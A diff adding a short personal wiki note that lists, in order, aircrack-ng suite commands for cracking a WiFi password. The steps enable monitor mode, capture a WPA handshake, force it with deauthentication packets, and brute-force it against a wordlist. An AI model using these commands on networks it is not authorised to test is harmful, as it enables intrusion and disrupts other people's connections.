@@ -1,0 +1,28 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-12T07:59:23-04:00
+
+====== wifi ======
+Created Tuesday 12 May 2020
+
+--airmon-ng check kill 
+--airmon-ng start wlan0
+--iwconfig  (to verify )
+
+we want a target now 
+
+--airodump-ng  wlan0mon
+(wlan0mon is new wlan0 --see iwconfig result to check wats yours)
+(2)--airodump-ng -c {channel }  --bssid  (bssid) -w capture wlan0mon
+
+--speedup process 2 by sending detach packets
+* aireplay-ng -0 1 -a {mac}  -c {station} wlan0mon
+
+once we get  handsakes ...
+ we now try to crack the password with different methods
+
+* aircrack-ng -w wordlist.txt -b {bssid of wifi}   (burteforcec attack )
+
+
+
+
